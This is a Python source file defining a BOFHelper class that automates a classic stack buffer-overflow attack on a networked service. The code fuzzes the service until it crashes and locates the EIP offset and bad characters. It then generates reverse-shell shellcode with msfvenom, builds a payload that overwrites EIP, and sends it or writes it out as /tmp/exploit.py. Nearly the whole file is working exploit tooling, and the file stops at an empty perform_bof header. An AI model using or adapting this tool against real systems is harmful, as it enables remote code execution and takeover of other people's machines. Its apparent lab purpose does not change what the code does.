#!/usr/bin/python
import socket
import time
from binascii import unhexlify
from re import search, split
from struct import pack
from subprocess import run

from pwn import asm

# Error codes
BOFErrorSuccess = 0
BOFErrorFailure = -1
BOFErrorConnectionRefused = -2
BOFErrorConnectionReset = -3
BOFErrorConnectionTimeout = -4
BOFErrorServiceAlive = -5
BOFErrorNoSpace = -6
BOFErrorInvalid = -7

BOFAllHex = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0a', '0b', '0c', '0d', '0e', '0f', '10', '11',
             '12', '13', '14', '15', '16', '17', '18', '19', '1a', '1b', '1c', '1d', '1e', '1f', '20', '21', '22',
             '23', '24', '25', '26', '27', '28', '29', '2a', '2b', '2c', '2d', '2e', '2f', '30', '31', '32', '33',
             '34', '35', '36', '37', '38', '39', '3a', '3b', '3c', '3d', '3e', '3f', '40', '41', '42', '43', '44',
             '45', '46', '47', '48', '49', '4a', '4b', '4c', '4d', '4e', '4f', '50', '51', '52', '53', '54', '55',
             '56', '57', '58', '59', '5a', '5b', '5c', '5d', '5e', '5f', '60', '61', '62', '63', '64', '65', '66',
             '67', '68', '69', '6a', '6b', '6c', '6d', '6e', '6f', '70', '71', '72', '73', '74', '75', '76', '77',
             '78', '79', '7a', '7b', '7c', '7d', '7e', '7f', '80', '81', '82', '83', '84', '85', '86', '87', '88',
             '89', '8a', '8b', '8c', '8d', '8e', '8f', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99',
             '9a', '9b', '9c', '9d', '9e', '9f', 'a0', 'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8', 'a9', 'aa',
             'ab', 'ac', 'ad', 'ae', 'af', 'b0', 'b1', 'b2', 'b3', 'b4', 'b5', 'b6', 'b7', 'b8', 'b9', 'ba', 'bb',
             'bc', 'bd', 'be', 'bf', 'c0', 'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'ca', 'cb', 'cc',
             'cd', 'ce', 'cf', 'd0', 'd1', 'd2', 'd3', 'd4', 'd5', 'd6', 'd7', 'd8', 'd9', 'da', 'db', 'dc', 'dd',
             'de', 'df', 'e0', 'e1', 'e2', 'e3', 'e4', 'e5', 'e6', 'e7', 'e8', 'e9', 'ea', 'eb', 'ec', 'ed', 'ee',
             'ef', 'f0', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'fa', 'fb', 'fc', 'fd', 'fe', 'ff']

# Live prefix/suffix options
BOFLiveOptions = ["payload_len", "local_host", "remote_host", "local_port", "remote_port"]


def live_option_long(option: str) -> bytes:
    return ("BOFLive." + option).encode()


def execute(cmd: str) -> bytes:
    return run(cmd, shell=True, capture_output=True).stdout


def is_hex(integer: str) -> bool:
    return not search(r"[^a-f0-9]", integer)


def is_register(reg: str) -> bool:
    regs = ['ax', 'bx', 'cx', 'dx', 'bp', 'sp', 'si', 'di']
    if len(reg) != 3:
        return False
    if reg[0] != "r" and reg[0] != "e":
        return False
    for item in regs:
        if reg[1:] == item:
            return True
    return False


def bytes_escape_all(in_byte: bytes) -> list[str]:
    out_str = []
    for b in in_byte:
        out_str.append(''.join('\\x{:02x}'.format(b)))
    return out_str


def bytes_escape_all_str(in_bytes: bytes) -> str:
    return "'{}'".format(''.join('\\x{:02x}'.format(b) for b in in_bytes))


def split_list(lst: list, n: int) -> list[list]:
    d, r = divmod(len(lst), n)
    for i in range(n):
        si = (d + 1) * (i if i < r else r) + d * (0 if i < r else i - r)
        yield lst[si:si + (d + 1 if i < r else d)]


class BOFHelper:
    def __init__(self, interface: str, local_port: int, ip: str, port: int, header: bytes = b"",
                 prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 10.0,
                 recv: bool = True, ask_crash: bool = False, strict: bool = False, verify: bool = False,
                 debug: bool = False):
        self._interface = interface
        self._lPort = local_port
        self._lIP = execute("ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1" % self._interface) \
            .decode().strip()
        self._ip = ip
        self._port = port
        self._header = header
        self._origHeader = header
        self._liveOptions = {}
        self._prefix = prefix
        self._suffix = suffix
        self._inc = inc  # The step of increment in getNumBytesToOverflow().
        self._timeout = timeout  # The default value of 200 would be the efficient for most services.
        self._recv = recv
        self._askCrash = ask_crash
        self._strict = strict
        self._verify = verify
        self._debug = debug

        self._init_options()

        self._numBytes = 0
        self._numBytesObtained = False
        self._strictSizeFound = False
        self._eipOffset = 0
        self._eipObtained = False
        self._badChars = ["00"]
        self._badCharsFound = False
        self._shellCode = b""
        self._shellCodeName = ""
        self._shellCodeGenerated = False
        self._espPadding = 0
        self._espPaddingSet = False
        self._firstStageASM = ""
        self._firstStage = b""
        self._stackSpace = 0
        self._shellCodeInESP = True
        self._spaceExpanded = False
        self._eip = b""
        self._exploit = b""
        self._endPadding = 0
        self._fileGenerated = False

    def __del__(self):
        if not self._fileGenerated:
            self._step_log("Printing information...")
            if self._strict and self._numBytesObtained:
                self._success_log("Strict payload size: %d" % self._numBytes)
            if self._eipObtained:
                self._success_log("EIP Offset: %d" % self._eipOffset)
            if self._espPaddingSet:
                self._success_log("ESP Padding: %d" % self._espPadding)
            if self._badCharsFound:
                self._success_log("Bad characters: 0x%s" % " 0x".join(self._badChars))
            if self._shellCodeGenerated and not self._shellCodeInESP:
                self._success_log(("First stage shell code: %s" % bytes_escape_all_str(self._firstStage))
                                  .replace("'", ""))
            if self._spaceExpanded:
                self._success_log("Stack space: %d" % self._stackSpace)
            if self._eip:
                self._success_log(("Overridden EIP: %s" % bytes_escape_all_str(self._eip)).replace("'", ""))

    # Logs & Helpers

    def _input(self, text: str, debug: bool = False) -> str:
        if (not debug) or (debug and self._debug):
            return input("(*) " + text).strip()

    def __log(self, text: str, debug: bool = False) -> None:
        if (not debug) or (debug and self._debug):
            print(text)

    def _func_log(self, text: str, debug: bool = False) -> None:
        self.__log("[-] " + text, debug)

    def _success_log(self, text: str, debug: bool = False) -> None:
        self.__log("[+] " + text, debug)

    def _debug_log(self, text: str) -> None:
        self.__log("(-) " + text, True)

    def _step_log(self, text: str, debug: bool = False) -> None:
        self.__log("(+) " + text, debug)

    def _prompt_log(self, text: str, debug: bool = False) -> None:
        self.__log("(*) " + text, debug)

    def _warn_log(self, text: str, debug: bool = False) -> None:
        self.__log("(!) " + text, debug)

    def _err_log(self, text: str, debug: bool = False) -> None:
        self.__log("(!!!) " + text, debug)

    def _prompt_restart(self) -> None:
        self._prompt_log("Please restart the vulnerable application. Type anything to continue...")
        input()

    def _prompt_debugger(self) -> None:
        self._prompt_log("GO! Fire up your debugger! Type anything to continue...")
        input()

    def _init_options(self) -> None:
        for option in BOFLiveOptions:
            full_option = live_option_long(option)
            if full_option in self._header:
                if option == "local_host":
                    self._liveOptions[full_option] = self._lIP.encode()
                elif option == "remote_host":
                    self._liveOptions[full_option] = self._ip.encode()
                elif option == "local_port":
                    self._liveOptions[full_option] = bytes(self._lPort)
                elif option == "remote_port":
                    self._liveOptions[full_option] = bytes(self._port)
                else:
                    self._liveOptions[full_option] = b""

    def _process_header_file(self, header: str) -> str:
        header = header.replace(live_option_long("payload_len").decode(), "' + str(len(payload)) + '") \
            .replace(live_option_long("local_host").decode(), self._lIP) \
            .replace(live_option_long("remote_host").decode(), self._ip) \
            .replace(live_option_long("local_port").decode(), str(self._lPort)) \
            .replace(live_option_long("remote_port").decode(), str(self._port))
        return header

    # @function send_data
    # @abstract Helper function sending data to designated port on the target.
    # @discussion   In this function, a socket is created to send the data in @buffer to @self._port.
    #               The payload would be sent with the predefined prefix and suffix, and if the
    #               request has timed out, it would be recursively resent (up to five times). To test
    #               if the service is open, simply pass an empty (i.e. "") @buffer as the argument.
    # @param buffer Bytes object storing the data to be sent.
    # @param trial  Records the number of time this request has been resent. Set to 5 to disable
    #               resending in case of socket timeout.

    def send_data(self, buffer: bytes, trial: int = 3, close: bool = True) -> int:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((self._ip, self._port))
            if self._origHeader:
                payload_len = live_option_long("payload_len")
                if payload_len in self._origHeader:
                    self._liveOptions[payload_len] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
                self._header = self._origHeader
                for option in self._liveOptions:
                    self._header = self._header.replace(option, self._liveOptions[option])

            s.send((self._header + self._prefix + buffer + self._suffix))
            if self._recv:
                res = s.recv(1024).decode()
                self._debug_log(res)
            if close:
                s.close()

            if self._verify and buffer:
                time.sleep(1)
                return self.send_data(b"")

        except ConnectionRefusedError:
            return BOFErrorConnectionRefused

        except ConnectionResetError:
            return BOFErrorConnectionReset

        except socket.timeout:
            if trial < 5:
                return self.send_data(buffer, trial + 1)
            self._err_log("Could not connect to %s at port %s!" % (self._ip, self._port))
            self._warn_log("Remember to start the service!")
            return BOFErrorConnectionTimeout

        return BOFErrorSuccess

    def _check_crash(self, error: int) -> bool:
        if self._askCrash:
            ans = self._input("Did the service crash? (y/n): ").lower()
            if ans == 'y':
                return True
            return False
        if error == BOFErrorConnectionReset or error == BOFErrorConnectionRefused:
            return True
        return False

    # @function _get_byte_for_overflow
    # @abstract Private function for finding a rough number of bytes needed to overflow the service.
    # @discussion     This function recursively sends buffers, incrementing in size each iteration by
    #                 @self._inc, to the service and checks if it has crashed. If an overflow has been
    #                 triggered successfully, it would return @current for use in its caller get_eip_offset().
    # @param current  The number of bytes that is to be sent to the service in the current iteration.
    # @result         @current if succeeded; BOFErrorConnectionRefused if failed to connect.

    def _get_byte_for_overflow(self, current: int = 0) -> int:
        if current == 0:
            self._debug_log("Checking if service is open...")
        else:
            self._debug_log("Fuzzing with %s bytes..." % current)

        error = self.send_data(b"\x90" * current)
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Service didn't crash -> increment @current by self._inc
        if not self._check_crash(error):
            if current == 0:
                self._debug_log("Service is open!")
            return self._get_byte_for_overflow(current + self._inc)

        # Service crashed -> print and proceed
        if current == 0:
            self._err_log("Service is not open!")
            return BOFErrorConnectionRefused

        self._success_log("Service crashed at %s bytes!" % current)
        self._prompt_restart()

        # high = @current (as it has successfully caused overflow)
        # low = previous @current (i.e. current - self._inc)
        self._numBytes = current
        return BOFErrorSuccess

    def _ask_eip(self, current) -> bool:
        ans = self._input("Is EIP overridden by 90909090 (y/n): ").lower()
        self._prompt_restart()
        if ans == 'y':
            self._success_log("Strict size found: %d" % current)
            self._numBytes = current
            self._numBytesObtained = True
            self._strictSizeFound = True
            return True
        return False

    def _find_crash_threshold(self, high: int = 0, low: int = 0) -> int:
        # Success!
        if low + 1 == high:
            self._success_log("Crash threshold found: %s!\n" % high)
            return high

        mid = low + (high - low) // 2  # Safe way to get mid
        self._debug_log("Sending buffer of size %s..." % mid)
        error = self.send_data(b"\x90" * mid)
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Did not crash -> set @low to mid
        if not self._check_crash(error):
            return self._find_crash_threshold(high, mid)

        # Service crashed -> set @high to mid
        if self._ask_eip(mid):
            return mid
        return self._find_crash_threshold(mid, low)

    def _find_strict_size(self, current: int) -> int:
        if self._strictSizeFound:
            return BOFErrorSuccess

        while True:
            self._prompt_debugger()
            if not self._check_crash(self.send_data(b"\x90" * current)):
                self._err_log("Service did not crash! (should never happen)")
                return BOFErrorInvalid
            if self._ask_eip(current):
                return BOFErrorSuccess
            current += 1
            continue
        return BOFErrorInvalid

    # @function _send_unique_pattern
    # @abstract Private function to send a unique pattern to the service with a given length.
    # @discussion   A unique pattern of @length is generated with the msf_pattern_create utility
    #               and sent to @self._port. If the service has crashed due to overflow, the user
    #               should provide the value at the EIP register which would be then used to
    #               identify the exact offset of EIP on the stack.
    # @param length The length of the pattern to be sent.
    # @result       @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect;
    #               BOFErrorServiceAlive if service did not crash; BOFErrorValueNotFound if value
    #               is not found in pattern.

    def _send_unique_pattern(self, length: int) -> int:
        self._prompt_debugger()
        error = self.send_data(execute("msf-pattern_create -l %s" % length))
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Service didn't crash. Bye!
        if not self._check_crash(error):
            self._err_log("Service did not crash!")
            return BOFErrorServiceAlive

        # Service crashed -> find EIP
        eip = self._input("Service crashed. Please enter the value in EIP: ").replace("\\x", "").replace("0x", "")
        esp = self._input("Please enter the first 4 bytes of ESP in the stack: ").replace("\\x", "").replace("0x", "")
        self._step_log("Locating offset of EIP in the pattern...")
        try:
            self._eipOffset = int(execute("msf-pattern_offset -q %s" % eip).decode().split()[-1])
            self._espPadding = int(execute("msf-pattern_offset -q %s" % esp).decode().split()[-1]) - self._eipOffset - 4
            self._espPaddingSet = True
        except IndexError:
            self._warn_log("Value not found in pattern!")
            return BOFErrorFailure
        self._eipObtained = True
        self._stackSpace = length - self._eipOffset - 4 - self._espPadding
        if self._stackSpace <= 0:
            self._err_log("Stack space should be greater than 0!")
            return BOFErrorInvalid
        self._success_log("EIP Offset: %s!" % self._eipOffset)
        self._success_log("ESP Padding: %s!" % self._espPadding)
        self._prompt_restart()
        return BOFErrorSuccess

    # @function get_eip_offset
    # @abstract Obtain the EIP offset for the specified service.
    # @discussion Utilizing a binary search approach, this function derives the EIP offset by recursively
    #             sending data of length @mid, the average of @high and @low. If the service did not crash,
    #             @low would be increased to @mid, and if it did, @high would be decreased to @mid. The EIP
    #             would be located exactly at the threshold of the overflow (when @low + 1 == @high).
    #             Note that the service may need to be restarted repeatedly in order for the function
    #             to work.
    # @param high The current minimum number of bytes needed to overflow the service.
    # @param low  The current maximum number of bytes that would not overflow the service.
    # @result     @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect.

    def get_eip_offset(self) -> int:
        if self._eipObtained:
            return self._eipOffset

        self._func_log("Fuzzing service...")
        if not self._numBytesObtained:
            if self._get_byte_for_overflow():
                return BOFErrorFailure
            self._numBytesObtained = True

        if self._strict and not self._strictSizeFound:
            threshold = self._find_crash_threshold(self._numBytes, self._numBytes - self._inc)
            if threshold == BOFErrorConnectionTimeout:
                return BOFErrorConnectionTimeout
            if self._find_strict_size(threshold):
                return BOFErrorFailure

        self._func_log("Locating EIP...")
        if self._send_unique_pattern(self._numBytes):
            return BOFErrorFailure
        return self._eipOffset

    def set_num_bytes(self, num_bytes: int, strict: bool = False):
        self._strict = strict
        self._numBytes = num_bytes
        self._numBytesObtained = True
        if strict:
            self._strictSizeFound = True

    # @function set_eip_offset
    # @abstract Manually set the EIP offset to a specified value.
    # @param offset The value @self._eipOffset is set to.

    def set_eip_offset(self, offset: int) -> None:
        if not self._espPaddingSet:
            self.get_esp_padding()
        if not self._numBytesObtained:
            self._numBytes = offset + 100
            self._numBytesObtained = True
        self._eipOffset = offset
        self._eipObtained = True

    def get_esp_padding(self) -> None:
        ans = self._input("How many bytes are between EIP and ESP (blank to skip): ")
        if ans == "" or ans == "q":
            self._espPadding = 0
            self._espPaddingSet = True
        self._espPadding = int(ans)
        self._espPaddingSet = True

    def set_esp_padding(self, padding: int) -> None:
        self._espPadding = padding
        self._espPaddingSet = True

    def __check_input(self) -> None:
        ans = self._input("Enter bad characters found (separate with space): ") \
            .lower().replace("\\x", "").replace("0x", "")
        if ans == "":
            self._success_log("Empty input, assuming that all bad characters have been found!")
            return

        for char in ans.split():
            if is_hex(char) and len(char) == 2:
                self._badChars.append(char)
                BOFAllHex.remove(char)

    def __check_dump(self, chars: list[str]) -> None:
        self._prompt_log("Dump at least %d bytes (stop input with \"q\"): " % len(BOFAllHex))
        new_chars = []
        while True:
            ans = input().strip().lower().replace("\\x", "").replace("0x", "")
            if ans == "q":
                break
            for item in split(r"[ |]", ans):
                if is_hex(item) and len(item) == 2:
                    new_chars.append(item)
        while new_chars[0] != chars[0] and new_chars[0] != "00":
            new_chars.pop(0)

        self._prompt_log("Processed dump: %s" % " ".join(new_chars))
        if self._input("Proceed? (y/n)\n").lower() != 'y':
            self._err_log("Dump malformed! Try again!")
            return self.__check_dump(chars)

        if len(new_chars) < len(chars):
            self._err_log("Dump is too small! Try again!")
            return self.__check_dump(chars)

        for i in range(len(chars)):
            if chars[i] != new_chars[i]:
                self._step_log("Identified new bad character: 0x%s" % chars[i])
                self._badChars.append(chars[i])
                BOFAllHex.remove(chars[i])

    def __build_bad_buffer(self, chars: list[str]) -> bytes:
        offset_len = self._eipOffset - len(chars)
        return b"\x90" * (offset_len // 2) \
               + unhexlify("".join(chars)) \
               + b"\x90" * (self._numBytes - len(chars) - (offset_len // 2))

    # @function __send_chars
    # @abstract Private function sending specified characters to service.
    # @discussion  This recursive function continuously send a list of strings to the service until all
    #              bad characters in it have been found. In each iteration, the user has to manually
    #              find the bad characters and update it through input, which would be then added to
    #              @self._badChars and removed from the @chars list.
    # @param chars The list of characters to be sent to the service.
    # @result      The update @chars if succeeded; [] if failed.

    def __send_chars(self, chars: list[str], manual: bool = False) -> int:
        error = self.send_data(self.__build_bad_buffer(chars))
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Service should always crash
        if not self._check_crash(error):
            self._err_log("Service did not crash! (should never happen)")
            return BOFErrorServiceAlive

        self._success_log("Characters sent!")
        if manual:
            self.__check_input()
            return BOFErrorSuccess

        self._prompt_log("Scroll to the middle of the 90's and make sure the dump starts with 01 02 03 04...!!!")
        self.__check_dump(chars)
        return BOFErrorSuccess

    def __send_chars_auto(self, chars: list[str]) -> int:
        self._debug_log("Sending: %s" % " ".join(chars))
        error = self.send_data(self.__build_bad_buffer(chars))
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # If the service has crashed, there would be no bad characters in this subset
        if self._check_crash(error):
            self._prompt_restart()
            return BOFErrorSuccess

        # Service did not crash
        if len(chars) == 1:
            self._step_log("Identified new bad character: 0x%s" % chars[0])
            self._badChars.append(chars[0])
            BOFAllHex.remove(chars[0])
            return BOFErrorSuccess

        # Split
        for chunk in split_list(chars, 2):
            if self.__send_chars_auto(chunk):
                return BOFErrorFailure

        return BOFErrorSuccess

    def _send_chars(self, size: int, auto: bool = False, manual: bool = False) -> int:
        for i in range(0, len(BOFAllHex), size):
            if auto:
                error = self.__send_chars_auto(BOFAllHex[i:i + size])
            else:
                error = self.__send_chars(BOFAllHex[i:i + size], manual)
            if error:
                return error
        return BOFErrorSuccess

    # @function find_bad_chars
    # @abstract Find bad characters in the service.
    # @discussion This function attempts to discover all bad characters presented in the service. It
    #             places a generated list of all characters in front of EIP, sends it to the service
    #             with _send_chars(), and sets @self._badCharsFound. If there is not enough space in
    #             the filler for all characters, this function would automatically split it into several
    #             roughly equal-sized segments and dispatch one at a time.
    #             Note that function get_eip_offset() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if failed; BOFErrorInvalid if function
    #             get_eip_offset() is not yet invoked.

    def find_bad_chars(self, manual: bool = False) -> int:
        if not self._eipObtained:
            self._err_log("Please first locate the EIP offset!")
            return BOFErrorInvalid

        if not self._badCharsFound:
            self._step_log("Starting automatic detection of bad characters...")
            size = self._eipOffset
            if self._eipOffset >= len(BOFAllHex):
                size = len(BOFAllHex)
            if self._send_chars(size, True):
                return BOFErrorFailure

            self._success_log("Automatic bad character detection complete!")
            self._success_log("Bad characters found: 0x%s" % " 0x".join(self._badChars))
            self._step_log("Sending characters to determine non-critical bad characters...")
            self._debug_log("Characters to send: 0x%s" % " 0x".join(BOFAllHex))
            self._prompt_debugger()
            if self._send_chars(size, False, manual):
                return BOFErrorFailure
            self._prompt_restart()

        self._badChars.sort()
        self._success_log("All bad characters: 0x%s" % " 0x".join(self._badChars))
        self._badCharsFound = True
        return BOFErrorSuccess

    # @function set_bad_chars
    # @abstract Manually input the bad characters identified.
    # @param bad_chars The value @self._badChars is set to.

    def set_bad_chars(self, bad_chars: list[str]) -> None:
        for item in bad_chars:
            if not is_hex(item) or len(item) != 2:
                bad_chars.remove(item)
        self._badChars.extend(bad_chars)
        self._badChars = list(set(self._badChars))
        self._badChars.sort()
        self._badCharsFound = True

    # @function generate_shellcode
    # @abstract Generate the shellcode for use in exploitation.
    # @discussion This function generates the shellcode with the command line package msfvenom. It
    #             first asks for the user to specify a payload to use - if it does not exist, a list
    #             of all available payloads would be printed. After successfully parsing the name,
    #             this function executes a msfvenom command to generate the payload, automatically
    #             completing the parameters with previously obtained values. The shellcode is stored
    #             in @self._shellCode.
    #             Note that function find_bad_chars() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorInvalid if function find_bad_chars() is not
    #             yet invoked.

    def generate_shellcode(self) -> int:
        self._func_log("Generating shellcode...")

        if not self._badCharsFound:
            self._err_log("Please first find the bad characters!")
            return BOFErrorInvalid

        # Add NOP slides
        self._shellCode += b"\x90" * int(self._input("Number of NOP slides: "))
        self._step_log("Generating list of all payloads...")
        all_payloads = execute("msfvenom --list payload").decode()
        while True:
            ans = self._input("Please enter the name of the payload to employ: ").lower()
            if ans in all_payloads:
                self._shellCodeName = ans
                break
            self._warn_log("Payload name does not exist. Printing help page...")
            print(all_payloads)

        if not self._lIP:
            self._warn_log("Failed to get local IP.")
            try:
                ip = self._input("Local IP: ")
                socket.inet_aton(ip)
            except socket.error:
                self._err_log("IP address invalid!")
                return BOFErrorFailure
            self._lIP = ip

        self._step_log("Generating shellcode %s..." % self._shellCodeName)
        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai "
                                   "-b \"\\x%s\"" % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
        self._shellCodeGenerated = True
        self._success_log("Shellcode generated!")
        return BOFErrorSuccess

    def _check_space(self, space: int) -> bool:
        self._step_log("Checking if a space of %d is available in ESP..." % space)
        if self._stackSpace >= space:
            self._success_log("Space (size = %d) available!" % space)
            return True

        if self._strict:
            if space > self._numBytes - self._eipOffset - 4 - self._espPadding:
                self._err_log("Space unavailable!")
                return False
            return True

        self._prompt_debugger()
        error = self.send_data(b"\x90" * self._eipOffset + b"A" * 4 + b"\x90" * self._espPadding + b"\x90" * space, 5)
        if error == BOFErrorConnectionTimeout:
            return False

        # Service should always crash
        if not self._check_crash(error):
            self._err_log("Service did not crash! (should never happen)")
            return False

        # User validation required
        ans = self._input("Payload sent. Check to see if EIP is filled with 41414141 and if there is %d 90's after it. "
                          "(y/n)\n").lower()

        # Success! Update stack space.
        if ans == 'y':
            self._success_log("Space (size = %d) available!" % space)
            self._stackSpace = space
            self._prompt_restart()
            return True

        self._prompt_restart()
        return False

    # @function _find_space
    # @abstract Private function to locate space before EIP for the payload.
    # @discussion This function checks if the space before EIP could be used to store the payload
    #             should ESP prove to be unavailable. If the space before EIP is larger than the
    #             size of @self._shellcode, it would proceed to insert a first stage shellcode in
    #             the ESP so that the program could jump to the shellcode. The user needs to provide
    #             the register that the filler appears to be in. If there is no space in ESP even
    #             for the first stage shellcode, the function would ask for an address with an
    #             instruction that directly jumps to the designated register if possible.
    # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
    #             payload.

    def _find_space(self) -> int:
        if self._eipOffset < len(self._shellCode):
            self._err_log("There is not enough space before EIP to insert the payload!")
            return BOFErrorNoSpace

        # Generate first stage shellcode
        self._prompt_debugger()
        if not self._check_crash(self.send_data(b"\x90" * self._numBytes)):
            return BOFErrorServiceAlive
        register = self._input("Please enter the register that records your payload: ").lower()
        if is_register(register):
            skip = int(self._input("Bytes to skip: "))
            if skip > 0:
                self._firstStageASM = "add %s, %d" % (register, skip)
                self._firstStage = asm(self._firstStageASM)
            jmp = "jmp %s" % register
            self._firstStage += asm(jmp)
            self._firstStageASM += jmp
            if not self._check_space(len(self._firstStage)):
                self._err_log("There is not enough space in ESP for the first stage shellcode!")
                return BOFErrorNoSpace
        else:
            # TO-DO: EGG HUNTER
            self._warn_log("Register invalid! Building egg hunter...")
            return BOFErrorInvalid

        self._prompt_restart()
        # We have the entire filler space at our disposal
        self._stackSpace = self._eipOffset
        self._spaceExpanded = True
        self._success_log("The filler space (%s) is all yours :)" % self._eipOffset)
        return BOFErrorSuccess

    # @function expand_space
    # @abstract Attempt to expand the available space to store the shellcode.
    # @discussion In order for the shellcode to be injected, there must be sufficient space to store
    #             it. If there were not an attempt to shrink the buffer in get_eip_offset(), this
    #             function should be executed to gather more space in the stack. If the available
    #             space already exceeds the shellcode length, there is no need to run this function.
    #             After sending a payload of len(@self._shellcode), this function asks user verification
    #             to check if the space is available. If not, it would proceed to _find_space() to
    #             look for space before EIP.
    #             Note that function generate_shellcode() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorServiceAlive if service did not crash; BOFError-
    #             ConnectionRefused if connection refused.

    def expand_space(self) -> int:
        self._func_log("Expanding space...")

        if self._spaceExpanded:
            return BOFErrorSuccess

        if not self._shellCodeGenerated:
            self._err_log("Please first generate the shellcode!")
            return BOFErrorInvalid

        if not self._espPaddingSet:
            self._err_log("Please manually set the ESP padding!")
            return BOFErrorInvalid

        if self._check_space(len(self._shellCode)):
            self._shellCodeInESP = True
            self._spaceExpanded = True
            return BOFErrorSuccess

        self._shellCodeInESP = False
        self._step_log("Unable to perform expansion. Proceeding to find space...")
        return self._find_space()

    # @function _build_exploit
    # @abstract Build the exploit after other functions are executed.
    # @result BOFErrorSuccess if succeeded; BOFErrorInvalid if function expand_space() is not yet invoked.

    def _build_exploit(self) -> int:
        self._func_log("Building exploit...")

        if not self._spaceExpanded:
            self._err_log("Please first expand space for shellcode!")
            return BOFErrorInvalid

        # Find return address (JMP ESP)
        self._prompt_log("Tip: !mona find -s \"\\xff\\xe4\"")
        ans = self._input("Enter address to overwrite EIP with: ").lower().replace("\\x", "").replace("0x", "")
        if not is_hex(ans) or len(ans) != 8:
            self._err_log("Address invalid!")
            return BOFErrorInvalid
        self._eip = pack("<I", int(ans, 16))
        if self._shellCodeInESP:
            self._exploit = b"\x90" * self._eipOffset + self._eip + b"\x90" * self._espPadding + self._shellCode
        else:
            self._exploit = self._shellCode + b"\x90" * (self._stackSpace - len(self._shellCode)) + self._eip + \
                            b"\x90" * self._espPadding + self._firstStage

        if self._strict:
            self._endPadding = self._numBytes - len(self._exploit)
            if self._endPadding > 0:
                self._exploit += b"\x90" * self._endPadding

        self._success_log("Exploit built successfully!", True)
        return BOFErrorSuccess

    # @function generate_file
    # @abstract Generate exploit.py that could be used for manual exploitation.
    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.

    def generate_file(self) -> int:
        self._func_log("Generating exploit.py...")

        if not self._exploit:
            if self._build_exploit():
                return BOFErrorFailure

        heading = "#!/usr/bin/python\n" \
                  "import socket\n\n" \
                  "try:\n" \
                  "    print '(-) Initializing variables...'\n\n"
        variables = "    # %s - LHOST: %s - LPORT: %d\n" \
                    "    shellcode = (" % (self._shellCodeName, self._lIP, self._lPort)
        shell_str = bytes_escape_all(self._shellCode)
        len_shell = len(shell_str)
        for i in range(0, len_shell, 15):
            if i > 0:
                variables += "                 "
            variables += "'" + ''.join(shell_str[i:i + 15])
            if len_shell - i > 15:
                variables += "'\n"
        variables += "')\n\n"

        payload_str = ("    payload = %s" % self._prefix).replace("b'", "'")
        if not self._shellCodeInESP:
            payload_str += " + shellcode"
        variables += "    # Bad characters: 0x%s\n" % " 0x".join(self._badChars)

        variables += ""
        if self._shellCodeInESP:
            eip_offset = self._eipOffset
        else:
            eip_offset = self._eipOffset - len(self._shellCode)
        if eip_offset > 0:
            variables += "    filler = '\\x90' * %d\n" % eip_offset
            payload_str += " + filler"

        variables += "    eip = %s\n" % bytes_escape_all_str(self._eip)
        payload_str += " + eip"

        if self._espPadding > 0:
            variables += "    offset = 'B' * %d\n" % self._espPadding
            payload_str += " + offset"

        if self._shellCodeInESP:
            payload_str += " + shellcode"
        else:
            variables += "    # %s" % self._firstStageASM
            variables += ("    first_stage = %s\n" % bytes_escape_all_str(self._firstStage)).replace("b'", "'")
            payload_str += " + first_stage"

        if self._strict and self._endPadding > 0:
            payload_str += " + '\\x90' * %d" % self._endPadding
        payload_str += (" + %s\n\n" % self._suffix).replace("b'", "'")
        variables += payload_str.replace("'' + ", "").replace(" + ''", "")

        if self._origHeader:
            variables += ("    buffer = %s\n"
                          "    buffer += payload\n\n" % self._origHeader).replace("    buffer = b", "    buffer = ")
            variables = self._process_header_file(variables)

        footing = "    print '(-) Sending payload...'\n" \
                  "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
                  "    s.connect(('%s', %d))\n" \
                  "    s.send(" % (self._ip, self._port)
        if self._origHeader:
            footing += "buffer"
        else:
            footing += "payload"

        footing += ")\n" \
                   "    s.close()\n" \
                   "    print '[+] Exploitation complete!'\n\n" \
                   "except:\n" \
                   "    print '(!!!) Exploitation failed!'\n" \
                   "    exit(0)\n"

        file = open("/tmp/exploit.py", "w")
        file.write(heading + variables + footing)
        file.close()
        self._success_log("Successfully generated /tmp/exploit.py!")
        self._fileGenerated = True
        return BOFErrorSuccess

    # @function send_exploit
    # @abstract Dispatch the exploit.
    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.

    def send_exploit(self) -> int:
        self._func_log("Exploiting...")

        if not self._exploit:
            if self._build_exploit():
                return BOFErrorFailure

        self._prompt_log("Remember to open up a listener on port %d if you are using the shellcode "
                         "to gain a reverse shell!" % self._lPort)
        input()
        self._verify = False

        error = self.send_data(self._exploit, 5, False)
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        if self._check_crash(error):
            self._err_log("Exploit failed. Try sending the payload manually.")
            return BOFErrorFailure

        self._success_log("Exploitation completed!!!")
        return BOFErrorSuccess

    # @function perform_bof
    # @abstract Perform a full BoF exploit with member functions.
    # @result True if succeeded; False if failed.

